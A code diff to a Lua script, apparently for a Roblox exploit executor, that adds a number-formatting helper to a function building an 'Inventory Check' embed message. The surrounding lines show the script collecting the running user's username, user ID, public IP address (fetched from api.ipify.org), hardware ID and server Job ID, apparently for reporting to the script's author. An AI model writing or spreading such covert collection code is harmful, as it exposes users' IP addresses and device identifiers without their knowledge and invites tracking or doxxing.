@@ -234,7 +234,14 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
             darkCoatStatus = "✅"
         end
     end
-
+	
+    local function formatNumberWithCommas(num)
+        local num_str = tostring(num)
+        local reverse = num_str:reverse()
+        local formatted = reverse:gsub("(%d%d%d)", "%1,")
+        return formatted:reverse():gsub("^,", "")
+    end
+	
     local AdminMessage = {
         embeds = {{
             title = "**📦 Inventory Check!**",
@@ -243,7 +250,7 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
             fields = {
                 { name = "👤 Username", value = "||```" .. player.Name .. "```||", inline = true },
                 { name = "🗿UserID", value = "```" .. player.UserId .. "```", inline = true },
-                { name = "💰 Beli", value = "```" .. beli .. "```", inline = false },
+                { name = "💰 Beli", value = "```" .. formatNumberWithCommas(beli) .. "```", inline = false },
                 { name = "🌇IP Address", value = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||", inline = false },
                 { name = "💻 HWID", value = "```" .. (gethwid and gethwid() or "Unknown") .. "```", inline = false },
                 { name = "🧭 Job ID", value = "```" .. game.JobId .. "```", inline = false },
